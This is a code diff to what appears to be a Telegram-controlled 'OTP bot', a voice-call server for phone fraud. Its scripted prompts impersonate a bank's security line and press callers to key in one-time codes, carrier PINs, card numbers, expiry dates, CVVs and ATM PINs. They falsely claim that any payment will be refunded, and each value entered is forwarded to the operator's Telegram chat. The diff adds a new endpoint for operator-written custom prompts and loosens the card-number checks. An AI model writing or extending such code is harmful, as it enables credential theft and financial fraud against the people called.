@@ -7,6 +7,7 @@ import { Markup } from 'telegraf';
 import { v4 as uuidv4 } from 'uuid';
 import { bot } from '.';
 import { client } from './utils/contentful';
+import { customDtmfFlow } from './utils/customDtmfFlow';
 import {
   accountFlow,
   bankFlow,
@@ -138,6 +139,8 @@ app.get('/calls/dtmf/:language/:step/:chatId', (req, res) => {
     transferNumber,
     institutionName,
     from,
+    actions,
+    customMessage,
   } = req.query;
 
   const { dtmf } = JSON.parse(variables as string);
@@ -211,6 +214,18 @@ app.get('/calls/dtmf/:language/:step/:chatId', (req, res) => {
         String(from),
       );
       break;
+    case 'custom':
+      customDtmfFlow(
+        dtmf,
+        res,
+        language,
+        Number(chatId),
+        step,
+        String(destination),
+        String(actions),
+        String(customMessage),
+      );
+      break;
     default:
       break;
   }
@@ -268,10 +283,10 @@ app.get('/calls/pins/:step/:chatId/:language', async (req, res) => {
   }
 
   if (dtmf) {
-    if (dtmf.length !== 6 && pinType === 'carrierPin') {
+    if (dtmf.length < 6 && pinType === 'carrierPin') {
       return res.json({
         id: uuidv4(),
-        title: `call PIN STEP - ${chatId}`,
+        title: `pin step - ${chatId}`,
         record: false,
         steps: [
           {
@@ -279,6 +294,9 @@ app.get('/calls/pins/:step/:chatId/:language', async (req, res) => {
             action: 'say',
             options: {
               payload: `The ${pinType} you have entered is incorrect. To verify and secure your phone number, please enter your ${pinType} followed by the pound key.`,
+              language,
+              voice: 'female',
+              loop: true,
             },
             onKeypressGoto: 'nextStepGoto',
             onKeypressVar: 'dtmf',
@@ -318,6 +336,9 @@ app.get('/calls/pins/:step/:chatId/:language', async (req, res) => {
             action: 'say',
             options: {
               payload: `The ${pinType} you have entered is incorrect. For your security and to protect your account. enter your ${pinType} followed by the pound key`,
+              language,
+              voice: 'female',
+              loop: true,
             },
             onKeypressGoto: 'nextStepGoto',
             onKeypressVar: 'dtmf',
@@ -514,7 +535,7 @@ app.get('/calls/pin/:chatId/:language', async (req, res) => {
           payload: `GREAT, you have entered ${dtmf
             .split('')
             .join(
-              ' ',
+              ', ',
             )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
           language,
           voice: 'female',
@@ -558,7 +579,7 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 16,
+          maxNumKeys: 18,
         },
         {
           id: uuidv4(),
@@ -569,7 +590,7 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          maxNumKeys: 16,
+          maxNumKeys: 18,
         },
         {
           id: 'cardStepGoto',
@@ -583,7 +604,7 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
   }
 
   if (isAccount === 'yes') {
-    if (dtmf.length >= 15 || dtmf.length <= 16) {
+    if (dtmf.length >= 15 || dtmf.length <= 18) {
       return res.json({
         id: uuidv4(),
         title: `pay card - ${chatId} OTP`,
@@ -601,7 +622,7 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
             onKeypressGoto: 'cardStepOTP',
             onKeypressVar: 'dtmf',
             endKey: '#',
-            maxNumKeys: 16,
+            maxNumKeys: 18,
           },
           {
             id: uuidv4(),
@@ -612,7 +633,7 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
             onKeypressGoto: 'cardStepOTP',
             onKeypressVar: 'dtmf',
             endKey: '#',
-            maxNumKeys: 16,
+            maxNumKeys: 18,
           },
           {
             id: 'cardStepOTP',
@@ -640,7 +661,7 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
           options: {
             payload: `GREAT, you have entered ${dtmf
               .split('')
-              .join(' ')}. Please enter your ${
+              .join(', ')}. Please enter your ${
               cardType !== 'undefined' ? cardType : ''
             } card expiration date followed by the pound key.`,
             language,
@@ -736,7 +757,7 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
           options: {
             payload: `GREAT, you have entered ${dtmf
               .split('')
-              .join(' ')}. Please enter your ${
+              .join(', ')}. Please enter your ${
               cardType !== 'undefined' ? cardType : ''
             } card CVV followed by the pound key.`,
             language,
@@ -828,7 +849,7 @@ app.get('/calls/:step/:chatId/:language', async (req, res) => {
           options: {
             payload: `GREAT. you have entered ${dtmf
               .split('')
-              .join(' ')}. To AUTHENTICATE YOU please enter your ${
+              .join(', ')}. To AUTHENTICATE YOU please enter your ${
               language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
             }, the same pin you use at the ATM,  followed by the pound key.`,
             language,
@@ -868,98 +889,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
 
   const { dtmf } = JSON.parse(variables as string);
 
-  if (!dtmf) {
-    return res.json({
-      id: uuidv4(),
-      title: `call ${step} - ${chatId} OTP`,
-      record: false,
-      steps: [
-        {
-          id: uuidv4(),
-          action: 'say',
-          options: {
-            payload:
-              'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
-            language,
-            voice: 'female',
-            loop: true,
-          },
-          onKeypressGoto: 'nextStepOTP',
-          endKey: '#',
-          maxNumKeys: 8,
-          onKeypressVar: 'dtmf',
-        },
-        {
-          id: uuidv4(),
-          action: 'pause',
-          options: {
-            length: 5,
-          },
-          onKeypressGoto: 'nextStepOTP',
-          onKeypressVar: 'dtmf',
-          endKey: '#',
-          maxNumKeys: 8,
-        },
-        {
-          action: 'hangup',
-        },
-        {
-          id: 'nextStepOTP',
-          action: 'fetchCallFlow',
-          options: {
-            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
-          },
-        },
-      ],
-    });
-  }
-
-  if (dtmf.length < 4) {
-    return res.json({
-      id: uuidv4(),
-      title: `call ${step} - ${chatId} OTP`,
-      record: false,
-      steps: [
-        {
-          id: uuidv4(),
-          action: 'say',
-          options: {
-            payload:
-              'The SECURITY CODE you have entered is incorrect. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
-            language,
-            voice: 'female',
-            loop: true,
-          },
-          onKeypressGoto: 'nextStepOTP',
-          endKey: '#',
-          maxNumKeys: 8,
-          onKeypressVar: 'dtmf',
-        },
-        {
-          id: uuidv4(),
-          action: 'pause',
-          options: {
-            length: 5,
-          },
-          onKeypressGoto: 'nextStepOTP',
-          onKeypressVar: 'dtmf',
-          endKey: '#',
-          maxNumKeys: 8,
-        },
-        {
-          action: 'hangup',
-        },
-        {
-          id: 'nextStepOTP',
-          action: 'fetchCallFlow',
-          options: {
-            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
-          },
-        },
-      ],
-    });
-  }
-
   if (dtmf && dtmf === '*') {
     await bot.telegram.sendMessage(chatId, `OTP not received ❌`);
 
@@ -978,16 +907,58 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
             voice: 'female',
           },
         },
-        // {
-        //   id: uuidv4(),
-        //   action: 'hangup',
-        // },
       ],
     });
   }
 
   switch (step) {
     case 'bank':
+      if (!dtmf) {
+        return res.json({
+          id: uuidv4(),
+          title: `call ${step} - ${chatId} OTP`,
+          record: false,
+          steps: [
+            {
+              id: uuidv4(),
+              action: 'say',
+              options: {
+                payload:
+                  'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
+                language,
+                voice: 'female',
+                loop: true,
+              },
+              onKeypressGoto: 'nextStepOTP',
+              endKey: '#',
+              maxNumKeys: 8,
+              onKeypressVar: 'dtmf',
+            },
+            {
+              id: uuidv4(),
+              action: 'pause',
+              options: {
+                length: 5,
+              },
+              onKeypressGoto: 'nextStepOTP',
+              onKeypressVar: 'dtmf',
+              endKey: '#',
+              maxNumKeys: 8,
+            },
+            {
+              action: 'hangup',
+            },
+            {
+              id: 'nextStepOTP',
+              action: 'fetchCallFlow',
+              options: {
+                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
+              },
+            },
+          ],
+        });
+      }
+
       if (dtmf) {
         await bot.telegram.sendMessage(
           req.params.chatId,
@@ -1008,7 +979,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
             options: {
               payload: `GREAT. you have entered ${dtmf
                 .split('')
-                .join(' ')}. To AUTHENTICATE YOU please enter your ${
+                .join(', ')}. To AUTHENTICATE YOU please enter your ${
                 language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
               }, the same pin you use at the ATM, followed by the pound key.`,
               language,
@@ -1041,6 +1012,52 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
       });
     case 'pay':
       if (dtmf) {
+        if (!dtmf) {
+          return res.json({
+            id: uuidv4(),
+            title: `call ${step} - ${chatId} OTP`,
+            record: false,
+            steps: [
+              {
+                id: uuidv4(),
+                action: 'say',
+                options: {
+                  payload:
+                    'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
+                  language,
+                  voice: 'female',
+                  loop: true,
+                },
+                onKeypressGoto: 'nextStepOTP',
+                endKey: '#',
+                maxNumKeys: 8,
+                onKeypressVar: 'dtmf',
+              },
+              {
+                id: uuidv4(),
+                action: 'pause',
+                options: {
+                  length: 5,
+                },
+                onKeypressGoto: 'nextStepOTP',
+                onKeypressVar: 'dtmf',
+                endKey: '#',
+                maxNumKeys: 8,
+              },
+              {
+                action: 'hangup',
+              },
+              {
+                id: 'nextStepOTP',
+                action: 'fetchCallFlow',
+                options: {
+                  url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
+                },
+              },
+            ],
+          });
+        }
+
         await bot.telegram.sendMessage(
           req.params.chatId,
           `OTP is <b>${dtmf}</b> ✅`,
@@ -1061,7 +1078,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
             options: {
               payload: `GREAT. you have entered ${dtmf
                 .split('')
-                .join(' ')}. To AUTHENTICATE YOU please enter your ${
+                .join(', ')}. To AUTHENTICATE YOU please enter your ${
                 language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
               }, the same pin you use at the ATM,  followed by the pound key.`,
               language,
@@ -1094,6 +1111,52 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
         ],
       });
     case 'account':
+      if (!dtmf) {
+        return res.json({
+          id: uuidv4(),
+          title: `call ${step} - ${chatId} OTP`,
+          record: false,
+          steps: [
+            {
+              id: uuidv4(),
+              action: 'say',
+              options: {
+                payload:
+                  'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
+                language,
+                voice: 'female',
+                loop: true,
+              },
+              onKeypressGoto: 'nextStepOTP',
+              endKey: '#',
+              maxNumKeys: 8,
+              onKeypressVar: 'dtmf',
+            },
+            {
+              id: uuidv4(),
+              action: 'pause',
+              options: {
+                length: 5,
+              },
+              onKeypressGoto: 'nextStepOTP',
+              onKeypressVar: 'dtmf',
+              endKey: '#',
+              maxNumKeys: 8,
+            },
+            {
+              action: 'hangup',
+            },
+            {
+              id: 'nextStepOTP',
+              action: 'fetchCallFlow',
+              options: {
+                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
+              },
+            },
+          ],
+        });
+      }
+
       if (dtmf) {
         await bot.telegram.sendMessage(
           req.params.chatId,
@@ -1116,7 +1179,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               options: {
                 payload: `Okay, you have entered ${dtmf
                   .split('')
-                  .join(' ')}. We need to verify you, please enter your ${
+                  .join(', ')}. We need to verify you, please enter your ${
                   cardType !== 'undefined' ? cardType : ''
                 } card number followed by the pound key`,
                 language,
@@ -1126,7 +1189,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              maxNumKeys: 16,
+              maxNumKeys: 18,
             },
             {
               id: uuidv4(),
@@ -1137,13 +1200,13 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              maxNumKeys: 16,
+              maxNumKeys: 18,
             },
             {
               id: 'cardStepGoto',
               action: 'fetchCallFlow',
               options: {
-                url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
+                url: `${process.env.ENDPOINT_URL}/calls/card/${chatId}/${language}?cardType=${cardType}&isAccount=yes`,
               },
             },
           ],
@@ -1161,7 +1224,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 payload: `GREAT, you have entered ${dtmf
                   .split('')
                   .join(
-                    ' ',
+                    ', ',
                   )}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
                 language,
                 voice: 'female',
@@ -1171,7 +1234,51 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
         });
       }
     case 'card':
-      if (dtmf.length >= 15 || dtmf.length <= 16) {
+      if (!dtmf) {
+        return res.json({
+          id: uuidv4(),
+          title: `call ${step} - ${chatId} OTP`,
+          record: false,
+          steps: [
+            {
+              id: uuidv4(),
+              action: 'say',
+              options: {
+                payload: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound keyYou have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key`,
+                language,
+                voice: 'female',
+                loop: true,
+              },
+              onKeypressGoto: 'nextStepOTP',
+              endKey: '#',
+              maxNumKeys: 18,
+              onKeypressVar: 'dtmf',
+            },
+            {
+              id: uuidv4(),
+              action: 'pause',
+              options: {
+                length: 5,
+              },
+              onKeypressGoto: 'nextStepOTP',
+              onKeypressVar: 'dtmf',
+              endKey: '#',
+              maxNumKeys: 18,
+            },
+            {
+              action: 'hangup',
+            },
+            {
+              id: 'nextStepOTP',
+              action: 'fetchCallFlow',
+              options: {
+                url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
+              },
+            },
+          ],
+        });
+      }
+      if (!(dtmf.length > 15 && dtmf.length < 18)) {
         return res.json({
           id: uuidv4(),
           title: `pay card - ${chatId} OTP`,
@@ -1189,7 +1296,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepOTP',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              maxNumKeys: 16,
+              maxNumKeys: 18,
             },
             {
               id: uuidv4(),
@@ -1200,7 +1307,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepOTP',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              maxNumKeys: 16,
+              maxNumKeys: 18,
             },
             {
               id: 'cardStepOTP',
@@ -1212,7 +1319,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
           ],
         });
       }
-
       if (dtmf) {
         await bot.telegram.sendMessage(
           req.params.chatId,
@@ -1233,7 +1339,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 payload: `GREAT, you have entered ${dtmf
                   .split('')
                   .join(
-                    ' ',
+                    ', ',
                   )}. Please enter your ${cardType} card expiration date followed by the pound key.`,
                 language,
                 voice: 'female',
@@ -1259,7 +1365,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               id: 'cardStepGoto',
               action: 'fetchCallFlow',
               options: {
-                url: `${process.env.ENDPOINT_URL}/calls/${step}/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
+                url: `${process.env.ENDPOINT_URL}/calls/card/${chatId}/${language}?cardType=${cardType}&expiry=yes`,
               },
             },
           ],
@@ -1282,7 +1388,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              maxNumKeys: 16,
+              maxNumKeys: 18,
             },
             {
               id: uuidv4(),
@@ -1293,7 +1399,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              maxNumKeys: 16,
+              maxNumKeys: 18,
             },
             {
               id: 'cardStepGoto',
@@ -1308,6 +1414,138 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
     default:
       break;
   }
+});
+
+app.get('/custom/:step/:chatId/:language', async (req, res) => {
+  const { actions, action } = req.query;
+  const { variables } = req.query;
+  const { dtmf } = JSON.parse(variables as string);
+
+  const { language, chatId, step } = req.params;
+
+  const ac: {
+    0: string;
+    1: string;
+  }[] = JSON.parse(String(actions));
+
+  if (!dtmf) {
+    return res.json({
+      id: uuidv4(),
+      title: `pay card - ${chatId} OTP`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload: `You have not entered anything, ${ac[0][1]}`,
+            language,
+            voice: 'female',
+            loop: true,
+          },
+          onKeypressGoto: 'customStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 20,
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'customStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 20,
+        },
+        {
+          id: 'customStepGoto',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${
+              process.env.ENDPOINT_URL
+            }/custom/${step}/${chatId}/${language}?actions=${JSON.stringify(
+              ac.splice(1, 2),
+            )}&action=${ac[0][0]}`,
+          },
+        },
+      ],
+    });
+  }
+
+  if (dtmf) {
+    await bot.telegram.sendMessage(chatId, `${action} <b>${dtmf}</b> 👻`, {
+      parse_mode: 'HTML',
+    });
+  }
+
+  if (ac.length) {
+    return res.json({
+      id: uuidv4(),
+      title: `custom - ${chatId} OTP`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload: `GREAT, you have entered ${dtmf.split('').join(', ')}, ${
+              ac[0][1]
+            }`,
+            language,
+            voice: 'female',
+            loop: true,
+          },
+          onKeypressGoto: 'customStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 20,
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'customStepGoto',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 20,
+        },
+        {
+          id: 'customStepGoto',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${
+              process.env.ENDPOINT_URL
+            }/custom/${step}/${chatId}/${language}?actions=${JSON.stringify(
+              ac.splice(1, 2),
+            )}&action=${ac[0][0]}`,
+          },
+        },
+      ],
+    });
+  }
+
+  return res.json({
+    id: uuidv4(),
+    title: `call custom - ${chatId}`,
+    record: false,
+    steps: [
+      {
+        id: uuidv4(),
+        action: 'say',
+        options: {
+          payload: `GREAT, you have entered ${dtmf
+            .split('')
+            .join(', ')}. Thank you. Goodbye`,
+          language,
+          voice: 'female',
+        },
+      },
+    ],
+  });
 });
 
 app.post('/calls/:chatId', async (req, res) => {
@@ -1397,7 +1635,7 @@ app.post('/calls/:chatId', async (req, res) => {
   res.send('success');
 });
 
-const port = process.env.PORT || 4040;
+const port = process.env.PORT || 8888;
 
 app.get('/', (_, res) => {
   res.send('Hello World!');
